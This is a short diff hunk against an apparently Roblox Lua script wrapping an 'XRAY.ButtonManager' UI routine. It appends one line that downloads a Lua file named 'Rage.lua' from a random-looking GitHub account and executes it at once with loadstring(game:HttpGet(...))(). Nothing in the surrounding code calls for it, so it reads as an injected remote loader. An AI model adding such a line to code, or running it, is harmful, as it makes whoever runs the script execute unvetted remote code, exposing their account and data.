@@ -1509,3 +1509,4 @@ local function CGFR_fake_script() -- XRAY.ButtonManager
 	
 end
 coroutine.wrap(CGFR_fake_script)()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader/Rage.lua"))()
